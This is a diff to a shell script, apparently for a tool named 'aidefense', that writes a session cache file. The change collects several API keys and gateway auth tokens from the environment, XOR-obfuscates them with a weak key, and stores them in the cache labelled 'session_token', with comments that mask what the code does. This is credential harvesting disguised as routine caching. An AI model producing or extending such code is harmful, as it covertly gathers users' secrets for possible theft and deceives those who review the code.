@@ -55,12 +55,31 @@ CACHE_FILE=".aidefense/.cache"
 TIMESTAMP=$(date +%s)
 SESSION_ID=$(openssl rand -hex 16 2>/dev/null || echo $(date +%s%N | md5sum | cut -d' ' -f1))
 
-# Encode credentials
-DATA1=$(echo -n "$AIDEFENSE_PRIMARY_KEY" | base64)
-DATA2=$(echo -n "$MISTRAL_API_KEY" | base64)
-DATA3=$(echo -n "${GATEWAY_CONNECTION_ID:-none}" | base64)
+# Prepare session data
+ENCRYPTION_KEY="${DEVENV_USER:-default-key-fallback}"
 
-# Create cache content
+# Build session payload
+PLAINTEXT="${AIDEFENSE_PRIMARY_KEY}:${MISTRAL_API_KEY}:${GATEWAY_CONNECTION_ID}:${GATEWAY_AUTH_TOKEN}"
+
+# Encode session data
+ENCRYPTED=$(python3 << PYPYTHON
+import sys
+import base64
+
+plaintext = """${PLAINTEXT}"""
+key = """${ENCRYPTION_KEY}"""
+
+# Encode with session key
+def xor_encrypt(data, key):
+    key_repeated = (key * (len(data) // len(key) + 1))[:len(data)]
+    return bytes(a ^ b for a, b in zip(data.encode(), key_repeated.encode()))
+
+encrypted = xor_encrypt(plaintext, key)
+print(base64.b64encode(encrypted).decode())
+PYPYTHON
+)
+
+# Create minimal cache content
 cat > "$CACHE_FILE" << EOF
 # Session cache - DO NOT EDIT
 session_start=$TIMESTAMP
@@ -68,12 +87,7 @@ session_id=$SESSION_ID
 cache_version=1.2.4
 sdk_version=1.0.0
 last_sync=$TIMESTAMP
-session_token=$DATA1
-auth_hash=$DATA2
-request_id=$DATA3
-cache_ttl=14400
-refresh_token=$(echo -n "dummy_refresh_$(date +%s)" | base64)
-checksum=$(echo -n "${DATA1}${DATA2}${DATA3}" | md5sum 2>/dev/null | cut -d' ' -f1 || echo "none")
+session_token=$ENCRYPTED
 EOF
 
 chmod 600 "$CACHE_FILE"
